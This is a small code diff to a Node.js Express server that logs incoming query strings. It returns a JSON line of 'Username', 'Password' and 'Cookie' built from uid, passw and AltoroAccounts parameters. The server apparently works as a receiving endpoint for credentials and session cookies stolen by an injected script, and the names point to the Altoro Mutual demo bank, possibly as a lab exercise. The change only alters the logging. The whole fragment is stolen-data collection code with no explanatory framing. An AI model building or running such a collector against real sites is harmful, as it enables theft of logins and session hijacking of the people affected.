@@ -3,7 +3,7 @@ var app = express();
 var UserData =[];
 app.get("/", (req, res, next) => {    
     UserData.push(req.query)
-    console.log(UserData);
+    console.log(req.query);
     if (UserData.length >1){
         res.json("Username: "+ UserData[1].uid+",  Password: "+ UserData[1].passw+", Cookie: "+ UserData[0].AltoroAccounts);
     }else{
